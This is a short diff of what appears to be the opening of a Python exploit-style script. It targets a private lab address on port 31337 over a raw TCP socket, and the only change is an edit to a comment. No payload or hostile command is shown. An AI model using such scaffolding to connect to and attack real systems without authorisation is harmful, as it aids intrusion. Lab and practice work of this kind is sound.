@@ -3,7 +3,7 @@ import socket
 import struct
 
 RHOST = "192.168.68.131"
-RPORT = 31337  # USE A LESSER-KNOWN PORT...?
+RPORT = 31337  # USE A LESSER-KNOWN PORT...
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.connect((RHOST, RPORT))
